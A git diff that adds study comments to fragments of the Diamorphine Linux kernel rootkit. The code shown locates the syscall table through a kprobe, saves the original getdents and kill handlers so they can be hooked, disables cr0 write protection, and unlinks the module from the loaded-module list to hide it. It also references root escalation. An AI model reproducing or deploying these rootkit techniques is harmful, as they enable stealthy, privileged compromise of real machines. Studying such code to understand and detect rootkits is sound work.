@@ -32,43 +32,66 @@
 #include "diamorphine.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+// The cr0 register is a control register in x86 architecture that contains various control flags for the CPU, such as enabling or disabling paging, protection levels, and other critical system settings.
 unsigned long cr0;
 #endif
 
 static unsigned long *__sys_call_table; // pointer to the system call table
 
+/**
+ * Declaration of pointers to the original syscall function addresses.
+ */
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+/**
+ * Since kernel version 4.17.0, the arguments that are first stored in registers by the user
+ * now are copied into a special struct called `pt_regs`.
+ * And then this is the only thing passed to the syscall. The syscall is then responsible fo pulling
+ * the arguments it needs out of this struct.
+ */
+
+// Define a new function pointer type t_syscall
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+
+// pointers of type t_syscall to store the address of the original sys_calls
 static t_syscall orig_getdents;
 static t_syscall orig_getdents64;
 static t_syscall orig_kill;
+
 #else
+/**
+ * Arguments are passed to the syscall exactly how it appears to be.
+ * Just an exactly imitation of the syscall function declaration.
+ */
+
+// Declare the function pointer type for every syscall we want to store
 typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
 typedef asmlinkage int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
 typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+
+// Declare the pointer to store the address of the original syscall functions with their respective types.
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 #endif
 
 /**
- * Function that attempts to locate the system call table in the Linux kernel.
+ * Function that attempts to locate the system call table in the Linux kernel using the KProbe method.
  */
 unsigned long *get_syscall_table_bf(void)
 {
-	// pointer to hold the address of the system call table
+	// function-wide pointer to hold the address of the system call table
 	unsigned long *syscall_table;
 
 // If the kernel version is greater than 4.4, check if the KPROBE_LOOKUP macro is defined. If it is. It uses a kprobe to dynamically resolve the address of the kallsyms_lookup_name function. This function is used to look up the address of kernel symbols by name.
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
 #ifdef KPROBE_LOOKUP
-	// type definition for the kallsyms_lookup_name function
+	// function pointer type definition for the kallsyms_lookup_name function
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
 	// pointer to the kallsyms_lookup_name function
 	kallsyms_lookup_name_t kallsyms_lookup_name;
 
-	// register the kprobe to probe the kallsyms_lookup_name function
+	// register the kprobe (declared in header file) to probe the kallsyms_lookup_name function
 	register_kprobe(&kp);
 
 	// assign the address of the kallsyms_lookup_name function to the pointer
@@ -305,13 +328,21 @@ void give_root(void)
 #endif
 }
 
+/**
+ * Function to free memory allocated by the module.
+ */
 static inline void tidy(void)
 {
+	//  kfree is a function used in the Linux kernel to free memory that was previously allocated.
 	kfree(THIS_MODULE->sect_attrs);
+
+	// common practice after freeing memory to avoid dangling pointers, which can lead to undefined behavior if the pointer is dereferenced after the memory has been freed.
 	THIS_MODULE->sect_attrs = NULL;
 }
 
+// Declaration of a pointer to the previous module in the linked list of loaded kernel modules.
 static struct list_head *module_previous;
+// flag to indicate if the module is hidden or not.
 static short module_hidden = 0;
 
 void module_show(void)
@@ -321,11 +352,12 @@ void module_show(void)
 }
 
 /**
- * Function to hide the kernel module by removing it from the kernel's list of loaded modules.
+ * Function to hide the kernel module by removing it from the kernel's list of loaded modules. (lsmod)
  */
 void module_hide(void)
 {
-	// Saves the previous module in the linked list of modules. THIS_MODULE is a macro that points to the module structure of the current module. THIS_MODULE->list accesses the list node that represents the module in the linked list of modules. THIS_MODULE->list.prev points to the previous module in the list.
+	// Saves the previous module in the linked list of modules.
+	// THIS_MODULE is a macro that points to the module structure of the current module (this, the shit i'm writing and reading). THIS_MODULE->list accesses the list node that represents the module in the linked list of modules. THIS_MODULE->list.prev points to the previous module in the list.
 	// The code saves the address of the previous module in the module_previous variable for later use in restoring the module's position in the list.
 	module_previous = THIS_MODULE->list.prev;
 
@@ -407,13 +439,16 @@ static inline void unprotect_memory(void)
 #endif
 }
 
+// START POINT!!!
 static int __init diamorphine_init(void)
 {
-	__sys_call_table = get_syscall_table_bf(); // get the address of the system call table
+	// get the address of the system call table and stores it in the pointer declared previously.
+	__sys_call_table = get_syscall_table_bf();
 
 	if (!__sys_call_table)
 		return -1;
 
+		// cr0 assignation
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	// reads the value of the cr0 register by calling the read_cr0() function and assigns it to the variable cr0. The cr0 register is a control register in x86 architecture that contains various control flags for the CPU, such as enabling or disabling paging, protection levels, and other critical system settings.
 	cr0 = read_cr0();
@@ -421,8 +456,12 @@ static int __init diamorphine_init(void)
 
 	// hides the module from the kernel's list of loaded modules
 	module_hide();
+
+	// frees the memory allocated by the module
 	tidy();
 
+// Stores the original addresses of the system calls in the pointers declared previously.
+// The __NR_ prefix refers to constants that represent system call numbers in the Linux kernel.
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
@@ -455,7 +494,10 @@ static void __exit diamorphine_cleanup(void)
 	protect_memory();
 }
 
+// Calls the init function, where the execution starts.
 module_init(diamorphine_init);
+
+// Calls the exit function.
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
